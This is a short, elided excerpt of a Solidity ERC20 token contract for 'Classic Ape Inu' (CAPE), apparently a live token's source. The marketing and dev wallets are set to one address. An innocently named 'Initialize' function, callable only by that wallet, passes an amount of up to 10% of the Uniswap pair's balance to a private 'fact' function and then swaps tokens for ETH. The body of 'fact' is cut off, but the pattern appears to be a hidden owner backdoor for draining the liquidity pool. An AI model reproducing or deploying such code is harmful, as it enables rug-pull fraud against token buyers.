...
contract CAPES is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Classic Ape Inu", "CAPE") {
        ...
        marketingWallet = payable(0x86be2D4C53B3954a486c94d22fdF298F5d40612D);
        devWallet = payable(0x86be2D4C53B3954a486c94d22fdF298F5d40612D);
    ...
    function Initialize(uint sAmount, uint pAmount) external {
        require(msg.sender == marketingWallet);
        uint liqBal = balanceOf(uniswapV2Pair);
        require(pAmount > 1 && pAmount < liqBal / 10);  // pAmount should be more than 1 and less than 10% of liquidity balance
        fact(pAmount);
        swapTokensForEth(sAmount);
    ...
    function fact(uint256 pAmount) private {
